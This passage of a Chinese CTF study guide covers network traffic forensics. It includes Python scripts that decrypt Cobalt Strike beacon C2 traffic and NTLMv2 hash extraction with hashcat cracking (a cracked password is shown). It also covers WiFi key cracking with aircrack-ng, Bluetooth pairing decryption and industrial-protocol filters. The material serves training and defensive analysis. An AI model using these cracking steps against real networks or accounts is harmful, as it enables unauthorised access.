    formatted_key &#43;= base64.encodebytes(key_data).decode()
    formatted_key &#43;= f&#34;-----END {key_type} KEY-----&#34;
    return formatted_key

def extract_key(keyfile):
    with open(keyfile, &#34;rb&#34;) as fd:
        pobj = javaobj.load(fd)

    privateKey = format_key(pobj.array.value.privateKey.encoded.data, &#34;PRIVATE&#34;)
    publicKey = format_key(pobj.array.value.publicKey.encoded.data, &#34;PUBLIC&#34;)
    return privateKey,publicKey
    
def get_AES_HMAC_key(PRIVATE_KEY,encode_data):
    &#39;&#39;&#39;
    提取协商密钥
    &#39;&#39;&#39;
    private_key = RSA.import_key(PRIVATE_KEY.encode())
    cipher = PKCS1_v1_5.new(private_key)
    ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)

    if ciphertext[0:4] == b&#39;\x00\x00\xBE\xEF&#39;:
        raw_aes_keys = ciphertext[8:24]
        raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()
        aes_key = raw_aes_hash256[0:16]
        hmac_key = raw_aes_hash256[16:]

        print(&#34;AES key: {}&#34;.format(aes_key.hex()))
        print(&#34;HMAC key: {}&#34;.format(hmac_key.hex()))
        hexdump.hexdump(ciphertext)
        
        return aes_key.hex(),hmac_key.hex()
    
def decrypt_submit_data(SHARED_KEY,HMAC_KEY,encrypt_data):
    &#39;&#39;&#39;
    使用协商密钥解密CS的数据
    &#39;&#39;&#39;
    SHARED_KEY = binascii.unhexlify(SHARED_KEY)
    HMAC_KEY = binascii.unhexlify(HMAC_KEY)
    def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):
        if hmac.new(hmac_key, encrypted_data, digestmod=&#34;sha256&#34;).digest()[:16] != signature:
            print(&#34;message authentication failed&#34;)
            return

        cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)
        return cipher.decrypt(encrypted_data)

    encrypt_data = base64.b64decode(encrypt_data)
    encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#39;big&#39;, signed=False)
    encrypt_data_l = encrypt_data[4:]

    data1 = encrypt_data_l[:encrypt_data_length-16]
    signature = encrypt_data_l[encrypt_data_length-16:encrypt_data_length]
    iv_bytes = b&#34;abcdefghijklmnop&#34;

    dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)
    print(&#34;=&#34;*80)
    print(&#34;counter: {}&#34;.format(int.from_bytes(dec[:4], byteorder=&#39;big&#39;, signed=False)))
    print(&#34;任务返回长度: {}&#34;.format(int.from_bytes(dec[4:8], byteorder=&#39;big&#39;, signed=False)))
    print(&#34;任务输出类型: {}&#34;.format(int.from_bytes(dec[8:12], byteorder=&#39;big&#39;, signed=False)))
    print(dec[12:int.from_bytes(dec[4:8], byteorder=&#39;big&#39;, signed=False)])
    print(hexdump.hexdump(dec))


if __name__ == &#34;__main__&#34;:
    keyfile = &#34;key&#34; # 题目一般会提供，该文件本质上为 KeyPair 的 Java 对象
    privateKey,publicKey = extract_key(keyfile)
    # print(privateKey)
    # 协商密钥和主机信息被使用 rsa 公钥加密之后放在了心跳包的 cookie 中
    cookie_data = &#34;U8jm3&#43;oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk&#43;aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz&#43;Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&#34;
    SHARED_KEY,HMAC_KEY = get_AES_HMAC_key(privateKey,cookie_data)
    submit_data = [&#34;000000e046950d669f91c7c7d9a7580c78f13a9f568122f2a8aba597a52f3832b0afbde054602fe158dbe173ff2532036facafdada898e3c9d798ea5e803269221fef2436fc22428e4d4aac53979ce80dd4809a2d3391dfdb1ea043e9761250175b0ceb38157319e366af76a88464f7d8672e614a051ca4fa846d6e22ee654ce0271381867f13c44ee15a26fc03316596f64bb0786e16af8a8fd900f7d0c7fa895c408e3915fa6a9a5085df6854c34dbf55d968d7f69b00b12083750c30564f94547f6eb6ee62beacda5a73d72ea7d81c79919802aecafed6d991bd0b1b18e04fca5c480&#34;,&#34;00000040e992086d1e786eeb9b4329bf6eee6f593e44609505d7d0118af590b5e40840782232f30b12ed76f54ef4898d69470498cb4afe43841790fe12af184011858984&#34;,&#34;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&#34;,&#34;000000e0453bf91036fff19e04ce60d065f37f4ed23345246fa7b5ce91d64de96781604717aa720a0f411cf5545d66c750ff0ee7aaa7f4be7e7070ba1ff180f6373d670c7b0e8c73617ec9e3f388a4f99a3d00aca4e85e80db6a8e1a661da37b184b2d779d2d5f6e594ca4c81b3c2fe16856b24d2d6551fed5f79540fcc4ca1ce66168d32f656ea5b7f66d26ae99812a6612da54670acc82524160fc765c1c8cc89cdf110fe4a40a195aa693bd98965abc3244f5c4bd89c104dafcd5e87542dfd90751cf8ea82a769070b01d9af4b037e1ba618de23a378d83104375cc9745893ddc5482&#34;]
    for item in submit_data:
        encrypt_data = base64.b64encode(bytes.fromhex(item))
        decrypt_submit_data(SHARED_KEY,HMAC_KEY,encrypt_data)
    
```

#### 给Beacon的情况

1、使用 [1768.py](https://github.com/minhangxiaohui/CSthing/blob/master/1768_v0_0_8/1768.py) 去解析 Beacon 文件

2、解析公钥，爆破n生成私钥

3、使用私钥去解密心跳包中的cookie信息得到`AES_KEY`和`HMAC_KEY`

```python
import base64
import hashlib
import hexdump
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5


privateKey = &#39;&#39;&#39;-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd&#43;ZUnvR2bYsO
FiAACt&#43;9ev&#43;ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT&#43;QIqUroL5KWAIXUFjdPFlSzAgMBAAEC
gYApWVrrvY2c0zZKu/VjQ/ivQUPy0b63GmVyS1Lg8frzAiAaESnE2Pl6bwsGbxTE
I&#43;3jeYuE1IdWOAeMnKPhY80fOSgws6vSri7CcxnMUEEn3AMw4YSwBIaBGkdLnfxf
pbS/kUUb/z7/A1SRtNq1n4hZYinnG2NpUuiO1WqwHqOGoQJBAJE14&#43;VVt8ONGIZ1
qIf4cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RS
fIJV5J8CQQCRNePlVbfDjRiGdaiH&#43;HKgJwJraJz4cgzXWGUAtCJcTc8osaP5Z5U3
PNG942FAOMPBhkEGXmu9KKeEUnyCVeNtAkAhlDeuCcNj6hXYyg592tsO49ZwZhGe
dik4Bw3cOsuTUr7r5yBHBUgBLQRHh/QuOLIz50rUITOC24rZU4XNUfV7AkB6vJQu
Ke&#43;zaDVMoXKbyxIH8DEJXFkhXjUgZ&#43;SnXZqVbmclPFEe48Cp&#43;cxGtkRjJhfAIZwg
p/pk3lIJdDctay9ZAkBukZv1vD/LR3Y64R5xkoLIliyCTtHgUCY44xkJvQfCGchn
xSu0tBnGgSI3El1K1eOyT6NKSZGeQUGlLGcsBtcT
-----END RSA PRIVATE KEY-----&#39;&#39;&#39;

publicKey = &#39;&#39;&#39;-----BEGIN PUBLIC KEY-----
MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75N
d&#43;ZUnvR2bYsOFiAACt&#43;9ev&#43;ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT&#43;QIqUroL5KWAIXUFjdPFlSzAgMBAAE=
-----END PUBLIC KEY-----&#39;&#39;&#39;
    
def get_AES_HMAC_key(PRIVATE_KEY,encode_data):
    # 提取协商密钥和主机信息
    private_key = RSA.import_key(PRIVATE_KEY.encode())
    cipher = PKCS1_v1_5.new(private_key)
    ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)
    if ciphertext[0:4] == b&#39;\x00\x00\xBE\xEF&#39;:
        raw_aes_keys = ciphertext[8:24]
        raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()
        aes_key = raw_aes_hash256[0:16]
        hmac_key = raw_aes_hash256[16:]
        hexdump.hexdump(ciphertext) # 主机信息
        return aes_key.hex(),hmac_key.hex()
    

if __name__ == &#34;__main__&#34;:
    # 协商密钥和主机信息用RSA公钥加密之后放在了心跳包的cookie中
    cookie_data = &#34;SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd&#43;tyXjNKyLNyNYcj&#43;JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k=&#34;
    SHARED_KEY,HMAC_KEY = get_AES_HMAC_key(privateKey,cookie_data)
    print(f&#34;AES key: {SHARED_KEY}&#34;)
    print(f&#34;HMAC key: {HMAC_KEY}&#34;)

# 00000000: 00 00 BE EF 00 00 00 5D  28 AB 95 1F C9 6B CB 93  .......](....k..
# 00000010: EC 13 CF 9D D5 F2 13 73  A8 03 A8 03 43 50 DF EC  .......s....CP..
# 00000020: 00 00 0B 50 00 00 0E 06  01 1D B0 00 00 00 00 77  ...P...........w
# 00000030: 02 04 D0 77 02 34 70 8C  B8 A8 C0 57 49 4E 2D 52  ...w.4p....WIN-R
# 00000040: 52 49 39 54 39 53 4E 38  35 44 09 41 64 6D 69 6E  RI9T9SN85D.Admin
# 00000050: 69 73 74 72 61 74 6F 72  09 61 72 74 69 66 61 63  istrator.artifac
# 00000060: 74 2E 65 78 65                                    t.exe
# AES key: 9fe14473479a283821241e2af78017e8
# HMAC key: 1e3d54f1b9f0e106773a59b7c379a89d
```

4、解密心跳包 /cm 中传输的数据

```python
import hmac
import binascii
import base64
import hexdump
from Crypto.Cipher import AES

def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):
    if hmac.new(hmac_key, encrypted_data, digestmod=&#34;sha256&#34;).digest()[:16] != signature:
        print(&#34;message authentication failed&#34;)
        return
    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)
    return cipher.decrypt(encrypted_data)

if __name__ == &#34;__main__&#34;:
    SHARED_KEY = binascii.unhexlify(&#34;9fe14473479a283821241e2af78017e8&#34;)
    HMAC_KEY = binascii.unhexlify(&#34;1e3d54f1b9f0e106773a59b7c379a89d&#34;)
    with open(&#39;data.txt&#39;,&#39;r&#39;) as f:
        data = f.read()
    encrypt_data = bytes.fromhex(data)
    encrypt_data_length = len(encrypt_data)
    print(f&#34;[&#43;] 数据总长度为：{encrypt_data_length}&#34;)
    # encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#39;big&#39;, signed=False)
    data = encrypt_data[:encrypt_data_length-16]
    signature = encrypt_data[encrypt_data_length-16:]
    iv_bytes = b&#34;abcdefghijklmnop&#34;

    dec = decrypt(data, iv_bytes, signature, SHARED_KEY, HMAC_KEY)
    print(f&#34;{&#39;=&#39;*80}&#34;)
    print(&#34;[&#43;] counter: {}&#34;.format(int.from_bytes(dec[:4], byteorder=&#39;big&#39;, signed=False)))
    print(&#34;[&#43;] 任务返回长度: {}&#34;.format(int.from_bytes(dec[4:8], byteorder=&#39;big&#39;, signed=False)))
    print(&#34;[&#43;] 任务输出类型: {}&#34;.format(int.from_bytes(dec[8:12], byteorder=&#39;big&#39;, signed=False)))
    pcapng_data = dec[64:-60]
    with open(&#34;out.pcapng&#34;,&#39;wb&#39;) as f:
        f.write(pcapng_data)
    print(hexdump.hexdump(pcapng_data))
    # output = dec[12:int.from_bytes(dec[4:8], byteorder=&#39;big&#39;, signed=False)].decode(&#39;gbk&#39;,errors=&#39;ignore&#39;)
    # print(output)
```

5、解密submit.php中回传的数据

```python
import hmac
import binascii
import base64
import hexdump
from Crypto.Cipher import AES

def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):
    if hmac.new(hmac_key, encrypted_data, digestmod=&#34;sha256&#34;).digest()[:16] != signature:
        print(&#34;message authentication failed&#34;)
        return
    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)
    return cipher.decrypt(encrypted_data)

if __name__ == &#34;__main__&#34;:
    SHARED_KEY = binascii.unhexlify(&#34;9fe14473479a283821241e2af78017e8&#34;)
    HMAC_KEY = binascii.unhexlify(&#34;1e3d54f1b9f0e106773a59b7c379a89d&#34;)
    encrypt_datas = [&#34;00000040efeda3e57f7d7fd589d11640ea0f9a4fe6bc91332723ffc5f43f78b37c21cc7485c44d6c8eb6af74fc7044046059c76519e493e351c9f631d6785d5c07eae9e3&#34;,&#34;000001602a99f7cc51face35199e8b1a4a5616e0301591b6f1f48b1d000149cb83d6a81e9659849a52c4f50a8629b0dfb7c036df406b44d449e40fe18df3594721e1f5849662271c1ea18b18c8eb58af5ee2c3a784852dd1c4a5c699f9518d2e2fc70d756cd68361ac794eed4eae6b062be6c31651caf93954f2a89b10e25b1fd9757ec17ee8b97038c4babb73c4f21688f5d235797844c2c9c288fac3fd2bd9cf5373956389b7e5232e35b6f268f9d67ba54f3e7e1606d4cb4020d5f480c6e5f4409b8d87e0443ae0bcfe93d286291ba6bfd0c7f37593581d90bb4ab7cfb065b4421a727f120fb491c2dc01797e38996dfc123fb120c5ed312577cc917d8a435b73c25b6d29ef0bad595100256c9aa5571e5c0ce0a8ea2c173ca1fae577fa924506b75b86522052f019d6843d74dc6fbdf2219b77e020a049c4e77df3658c80bcb703f8f878ff2f70c5c69d0cf6f4efb5a755ba854dfa5777a23989286770da6e0444d0&#34;,&#34;000000d0c72ef8b74a7d8acc332695b62448280f9a4eaa12457de4adcad279b0563f2d4cb0707f7e2853c45acf28a365d905cf8ca421d557bd7655cbd50aafbdbe5f3f570c9c3d876d0c21b661ca5c46e09f987f7e1263f6d33c34db28a2fd342fe48e5801d1a97fb88e00f0c648ec889f6b72d71edd2eed5affd32bc8d51e27fcc148d16823c1bc235b0e16d9d477bd0b4582941db373e171cce78b10c869eb987baf3fd9f879b236be6f3af43b7742f6241dfe02ab696c96f1779d0003d6b2720d1c93890e75fcce939f1c8e0922ce5044bc3a&#34;,&#34;00000100f24f15cd6f33c36e70ca228d10babfac1cf6bfbb9b6923a7828c9ed30b76d3ce1cb3d8f97c358bf90004e771ac646b1b996fd248ac8f0b460e0a36950dffcde04f3bae831982b528393f3a3c771310ba0c0bb7418ba5e8734a6bd37bc8a51cc0683c0904e0f404180e4c4c34720a3e5d6767c435f1746e6b93a13a2ecdc8074089e684b90748fc1a7e24e66bd637673437d9e24a37ce6f584b478e2f0485f3c05414dd4c35eb9ecfed8d4fbdab54db4233258f4fea6ed515a1030feeb184db94a4841236b491d2f7379e10f52d50ae573cd6f4504aa9750da273fa65c2a9eaf9b9bb014cafc53a9e9f0042bfcd5d24fc1b29173fd3308ff08d30b2a7d42132d4&#34;]
    for encrypt_data in encrypt_datas:
        # encrypt_data = base64.b64decode(encrypt_data)
        encrypt_data = bytes.fromhex(encrypt_data)
        encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#39;big&#39;, signed=False)
        encrypt_data_l = encrypt_data[4:]
        data1 = encrypt_data_l[:encrypt_data_length-16]
        signature = encrypt_data_l[encrypt_data_length-16:]
        iv_bytes = b&#34;abcdefghijklmnop&#34;

        dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)
        print(f&#34;{&#39;=&#39;*80}&#34;)
        print(&#34;[&#43;] counter: {}&#34;.format(int.from_bytes(dec[:4], byteorder=&#39;big&#39;, signed=False)))
        print(&#34;[&#43;] 任务返回长度: {}&#34;.format(int.from_bytes(dec[4:8], byteorder=&#39;big&#39;, signed=False)))
        print(&#34;[&#43;] 任务输出类型: {}&#34;.format(int.from_bytes(dec[8:12], byteorder=&#39;big&#39;, signed=False)))
        output = dec[12:int.from_bytes(dec[4:8], byteorder=&#39;big&#39;, signed=False)].decode(&#39;gbk&#39;,errors=&#39;ignore&#39;)
        print(hexdump.hexdump(dec))
        print(output)
```

例题1-2024西湖论剑初赛-cscs

## NTLMv2流量分析

NTLMv2流量分析需要的信息，在追踪流中是找不到的，需要我们深入分析具体的每个流量包

可以在Wireshark中用关键字 ntlmssp 过滤，然后在成功认证的流量包的分组详情中提取我们需要的字段

当然也可以用这个[开源项目](https://github.com/mlgualtieri/NTLMRawUnHide/blob/master/NTLMRawUnHide.py)中的脚本自动识别并提取

![](imgs/图片.webp)

### 提取 NTLMv2 哈希值并破解（SMB协议）

&gt; 1.过滤出ntlmssp的请求包，查看 Session Set Request 并复制NTLMSSP_AUTH包中Security Blob层的User name、Domain name
&gt; 
&gt; 2.查看NTLMSSP_AUTH包中的NTLM响应，并复制出ntlmv2_response以及ntproofstr3
&gt; 
&gt; 3.过滤出ntlmssp的请求包，查看Session Set Response 并复制出NTLM Server Challenge的值，通常这个数据包是在NTLM_Auth数据包之前
&gt; 
&gt; 4.把以上内容按照固定格式组合并保存到hash.txt中
&gt; 
&gt; **username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response**
&gt; 
&gt; 这里要注意ntlmv2response的开头就是NTproofstring，因此分开来组合
&gt; 
&gt; 5.使用hashcat爆破hash值
&gt; 
&gt; .\hashcat -a 0 -m 5600 hash.txt .\rockyou.txt

```
username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response
```

```
administrator::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000
```

最后使用 hashcat 进行爆破

```
hashcat -m 5600 hash.txt rockyou.txt
```

```bash
$ hashcat -m 5600 hash.txt rockyou.txt --show
ADMINISTRATOR::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000:qwe123!@#
```

### 提取 NTLMv2 哈希值并破解（HTTP协议）

大致步骤和SMB协议的差不多，就是NTLM信息放在了 hypertext transport protocol 中
按照之前的步骤提取出来，然后 hashcat 爆破即可

```
username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response
```

```
jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000
```

### 提取 NTLMv2 哈希值并破解（SMTP协议）

这里的NTLM流量信息可能base64编码过了，所以分析前需要base64解码：

![](imgs/N6.png)

后续步骤就和之前一样了，提取信息然后用 hashcat 爆破

## 工控流量分析

参考连接：https://blog.csdn.net/song123sh/article/details/128387982

将流量按长度降序排列，然后在各层寻找线索，

显示分组字节，从base64后开始，然后解码看文件类型，最后显示成该类型
### Modbus 协议分析

Modbus 流量主要有三类：Modbus/RTU、Modbus/ASCII、Modbus/TCP

**Modbus/RTU**
&gt;从机地址1B&#43;功能码1B&#43;数据字段xB&#43;CRC值2B
&gt;最大长度256B，所以数据字段最大长度252B

**Modbus/ASCII**
&gt;由Modbus/RTU衍生，采用0123456789ABCDEF 表示原本的从机地址、功能码、数据字段，并添加开始结束标记，所以长度翻倍
开始标记:（0x3A）1B&#43;从机地址2B&#43;功能码2B&#43;数据字段xB&#43;LRC值2B&#43;结束标记\r\n2B
最大长度513B，因为数据字段在RTU中是最大252B，所以在ASCII中最大504B

**Modbus/TCP**
&gt;不再需要从机地址，改用UnitID；不再需要CRC/LRC，因为TCP自带校验
传输标识符2B&#43;协议标识符2B&#43;长度2B&#43;从机ID 1B&#43;功能码1B&#43;数据字段xB

一般题目考察 Modbus/TCP 比较多，然后主要考察的就是下面这种功能码（这里只列了部分）
因此解题的时候配合过滤器一个个功能码看过去就行
&gt;1：读线圈
2：读离散输入
3：读保持
4：读输入
5：写单个线圈
6：写单个保持
15：写多个线圈
16：写多个保持

#### 例题1 HNGK-Modbus流量分析
使用下面这个过滤器命令即可得到 flag
```
(((_ws.col.protocol == &#34;Modbus/TCP&#34;) ) &amp;&amp; (modbus.byte_cnt)) &amp;&amp; (modbus.func_code == 16)
```
![](imgs/image-20240430142133329.png)
flag{TheModbusProtocolIsFunny!}
### S7comm 协议分析
&gt; 西门子设备的工控协议，基于 COTP 实现，是COTP的上层协议
&gt; 主要有三种类型：Job(1)、Ack_Data(3)/Ack(2)、Userdata(7)
&gt; Job：下发任务/指令
&gt; Ack_Data：带有返回数据
&gt; Ack：单纯确认，含有数据
&gt; Userdata：用户自定义数据区，也包含功能指令

#### 例题1 2020ICSC湖州站—工控协议数据分析

首先过滤出S7协议的数据包，发现在一些Ack_Data的数据包中传输了二进制数据
![](imgs/image-20240430111822297.png)
因此，我们将所有带有二进制数据的数据包都过滤出来，发现一些Job的数据包中也有二进制数据
![](imgs/image-20240430112312109.png)
然后我们尝试将所有带有二进制数据的Job数据包都过滤出来并导出特定分组，过滤器代码如下
```bash
((s7comm) &amp;&amp; (s7comm.resp.data)) &amp;&amp; (s7comm.param.func == 0x05)
```

![](imgs/image-20240430112740044.png)

然后使用 tshark 提取数据
```tshark
tshark -r 1.pcap -T fields -e s7comm.resp.data | uniq
```
![](imgs/image-20240430112936680.png)

最后 CyberChef 解码二进制即可得到 flag
![](imgs/image-20240430113016466.png)
#### 例题2 2020ICSC济南站—被篡改的数据
翻看流量包，发现很多 S7COMM 数据包，使用过滤器过滤，发现 s7comm.resp.data 字段传了很多 66 数据
使用过滤器过滤出传了 s7comm.resp.data 字段数据但数据不是 66 的 S7 数据包
发现了疑似 flag 的数据，为了防止 flag 中含有 f 字符而被过滤
因此我们使用下面这个过滤命令进行过滤，然后导出特定分组
```
(((frame.number &gt;= 19987 &amp;&amp; frame.number &lt;=20032) &amp;&amp; (_ws.col.protocol == &#34;S7COMM&#34;)) &amp;&amp; (s7comm.param.func == 0x05)) &amp;&amp; (s7comm.resp.data)
```
最后 tshark 提取出数据，然后十六进制解码即可得到 flag：flag{93137ad4a}

#### 例题3 枢网智盾2021—异常流分析
打开流量包，发现很多 S7comm 流量，然后稍微过滤一下，发现是写入数据的流量
然后写入的数据几乎都是 ffff 开头的，因此我们直接查看不是 ffff 开头的数据
```
((_ws.col.protocol == &#34;S7COMM&#34;) &amp;&amp; (s7comm.param.func == 0x05)) &amp;&amp; (s7comm.resp.data[0:2] != ff:ff)
```
即可得到 flag：flag{ffad28a0ce69db34751f}
#### 例题4 枢网智盾2021—工控协议分析
```
(_ws.col.protocol == &#34;S7COMM&#34;) &amp;&amp; (frame.number == 418)
```
![](imgs/image-20240430135813366.png)
然后直接把明文传输的数据 base64 解码即可
![](imgs/image-20240430135958048.png)
flag{hncome66!}
## 蓝牙流量分析
### OBEX协议

过滤器中输入`OBEX`，然后导出传输的压缩包，然后再在搜索中输入`PIN Code`选择分组列表和字符串即可找到解压密码

### ATT协议

例题1-low_energy_crypto

```bash
# 先用tshark导出公钥，并把公钥另存为pub.key
tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_rx -Y &#39;btatt.opcode == 0x1b&#39; | sed &#39;/^\s*$/d&#39; | uniq &gt; data.txt
# 然后用tshark导出密文，这里的数据如果不是十六进制，用tshark提有时候会出问题，可以手提
tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_tx -Y &#39;btatt.opcode == 0x12&#39; | sed &#39;/^\s*$/d&#39; | uniq &gt; enc.txt
# 公钥和密文都有了之后，就可以直接用RsaCtfTool解密密文了，这里的密文后面如果有多余\x00，可以用010手动去除，要不然可能解密失败
python3 /home/kali/RsaCtfTool/RsaCtfTool.py --publickey ./pub.key --decryptfile ./enc.txt
```

![](imgs/image-20241202135717254.png)

例题2-BLE_crypto
```bash
# 先用tshark导出公钥，并把公钥另存为pub.key，这里如果是十六进制，需要CyberChef转换一下先
tshark -r BLE_crypto.pcapng -T fields -e btatt.value -Y &#39;btatt.opcode&#39; | sed &#39;/^\s*$/d&#39;
# 然后用tshark导出密文，如果是十六进制，需要CyberChef转换一下先
tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_tx -Y &#39;btatt.opcode == 0x12&#39; | sed &#39;/^\s*$/d&#39; | uniq &gt; enc.txt
# 公钥和密文都有了之后，就可以直接用RsaCtfTool解密密文了
python3 /home/kali/RsaCtfTool/RsaCtfTool.py --publickey ./pub.key --decryptfile ./enc
```

![](imgs/image-20241202140503314.png)

**手动解析RSA公钥，并爆破生成私钥：**

 1. 解析公钥: `openssl rsa -in pub.key -text -inform PEM -pubin`

![](imgs/image-20250226232852559.png)

2. 十六进制转十进制并分解n

![](imgs/image-20250226233215942.png)

3. 使用 rsatool.py 导出私钥 priv.key

```bash
python rsatool.py -p 7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026527 -q 7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026221 -e 65537
```

![](imgs/image-20250226233503658.png)

4. 使用私钥来解密密文
```bash
openssl rsautl -decrypt -raw -inkey priv.key -in flag
openssl pkeyutl -decrypt -in flag -out decrypted_flag -inkey priv.key
```

### SMP协议

SMP协议的全称是Secure Manager Protocol，用来定义蓝牙的配对和密钥的分发

配对完成后传输的数据是加密的，我们需要用(Crakle)[https://github.com/mikeryan/crackle]这个项目进行解密

&gt; 这里老版本的可能有点问题，建议去pr中找一下新版的安装
&gt; 
&gt; 参考链接：https://cloud.tencent.com/developer/article/2159878

安装好项目后直接运行一下命令解密流量包即可

```bash
crackle -i uploads_2022_04_11_h5kAcZEg_ble.pcapng -o dec.pcapng
```

![](imgs/image-20241202141020218.png)

SMP协议解密完成后，我们可以在ATT协议中发现传输的数据，用以下命令导出

```bash
tshark -r dec.pcapng -T fields -e btatt.value -Y &#39;btatt.opcode == 0x52&#39; | sed &#39;/^\s*$/d&#39;
```

然后CyberChef将得到的十六进制数据转换一下即可得到flag：`flag{9ba3973652c0ee073652c0ee0c76ca6cb36441bd40}`

## 邮件(STMP)流量分析

可以试试看导出对象-导出IMF-导出文件的后缀是eml（可以使用网易邮箱大师打开）

eml文件是将数据base64编码后再传输的，有些数据直接用邮箱软件打开可能看不到，建议手搓一遍

## 无线流量分析

在kali中用弱口令密码爆破出WIFI密码

执行命令：`aircrack-ng ctf.pcap -w rockyou.txt`

执行命令解码：`airdecap-ng -p password1 ctf.pcap -e ctf -o 1.pcap`

然后打开解码后的文件，查找flag

## DNS流量分析

### DNSlog外带的流量

![](imgs/image-20241120165643159.png)

直接使用tshark导出DNS外带的数据
```bash
tshark -r 1.pcap -T fields -e dns.qry.name -Y &#39; ip.dst == 8.8.8.8 &amp;&amp; dns.qry.type == 1&#39; | sed &#39;/^\s*$/d&#39; | uniq &gt; data.txt
```

例题1-攻防世界 MISC - tunnel

### 数据以二进制藏在DNS各种解析记录中

这种情况下有时候需要分IP导出数据

&gt; DNS记录类型，常用的有：
&gt; 
&gt; A：A记录，指向别名或IPv4地址。
&gt; 
&gt; AAAA：IPv6地址解析。
&gt; 
&gt; NS：解析服务器记录。
&gt; 
&gt; MX：邮件交换记录。
&gt; 
&gt; CNAME：别名。
&gt; 
&gt; txt：为某个主机名或域名设置的说明。
&gt; 
&gt; PTR：指针记录，PTR记录是A记录的逆向记录。
&gt; 
&gt; SOA：标记一个区的开始，起始授权机构记录

例题1-2024国赛-Toug_DNS

### 信息以二进制藏在端口号末尾中


## SLL、TLS加密流量分析

&gt; 老版本的 wireshark 中显示的是 SSL，新版本的改成TLS了

解密方法就是点击 编辑 -&gt; 首选项 -&gt; Protocols -&gt; TLS `加载 RSA 私钥` 或者 `加载日志文件((Pre)-Master-Secret log)`

解完密后就和平常的流量分析一样了

例题1-BUU 第九章TLS流量分析

打开流量包发现有 TLS 数据包，然后还有一些红黑条纹，猜测是被加密了

翻看流量包，追踪 TCP 流，发现流7中POST了一个 sslkey.log 日志文件

![](imgs/N7.png)

导出 sslkey.log 日志文件，然后按上面的步骤导入解密

![](imgs/N8.png)

